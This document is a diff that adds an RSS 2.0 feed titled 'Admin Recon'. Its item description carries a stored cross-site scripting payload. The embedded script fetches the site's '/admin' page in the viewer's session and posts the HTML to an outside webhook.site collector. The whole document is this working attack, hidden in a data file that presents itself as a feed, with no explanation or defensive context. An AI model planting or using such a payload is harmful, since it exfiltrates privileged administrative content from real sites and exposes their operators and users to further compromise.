@@ -1,0 +1,20 @@
+<rss version="2.0">
+<channel>
+<title>Admin Recon</title>
+<item>
+<title>Recon</title>
+<description><![CDATA[
+<script>
+fetch('/admin')
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://webhook.site/0fddd75d-b658-40a0-8756-cfe17a0793b1', {
+      method: 'POST',
+      body: 'Admin page: ' + html
+    });
+  });
+</script>
+]]></description>
+</item>
+</channel>
+</rss>
